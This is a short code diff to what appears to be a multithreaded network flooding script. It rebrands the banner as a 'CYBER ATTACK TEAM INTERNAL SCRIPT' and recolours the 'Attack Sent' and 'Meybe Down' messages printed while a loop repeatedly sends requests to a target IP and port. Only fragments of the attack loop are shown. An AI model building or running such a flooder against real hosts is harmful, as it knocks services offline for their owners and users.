@@ -28,8 +28,8 @@ logo = """
             ▒▒▒▒▒         ▒▒                 ▒▒     ▒
              ▒▒▒          ▒▒                 ▒       ▒
             ▒▒            ▒                   ▒      ▒
-\033[37m            
-\033[37m                  FOR  ANY  FORM  OF  MISUSE
+\033[37m              C Y B E R   A T T A C K   T E A M 
+\033[37m                I N T E R N A L   S C R I P T      
 \033[33m                       Design By: KF24
 \033[96m                         ——°oO0Oo°——
 ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞
@@ -102,11 +102,11 @@ def start():
             for i in range(packs):
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
-                print("\033[33m[★\033[33m]  \033[33m[CAT]  \033[37m[Attack Sent]  \033[97m{0}:{1}  \033[34m{2}\033[0m".format(str(ip), int(port), xx))
+                print("\033[33m[★\033[33m]  \033[33m[CAT]  \033[37m[Attack Sent]  \033[35m{0}:{1}  \033[34m{2}\033[0m".format(str(ip), int(port), xx))
                 
         except:
                 s.close()
-                print("[x]  \033[33m[CAT]  \033[37m[Attack Sent]  \033[97m{0}:{1}  \033[37m{2}\033[0m".format(str(ip), int(port), xx))
+                print("[x]  \033[33m[CAT]  \033[37m[Meybe Down]  \033[35m{0}:{1}  \033[37m{2}\033[0m".format(str(ip), int(port), xx))
                     
 for x in range(thread):
     thred = threading.Thread(target=start)
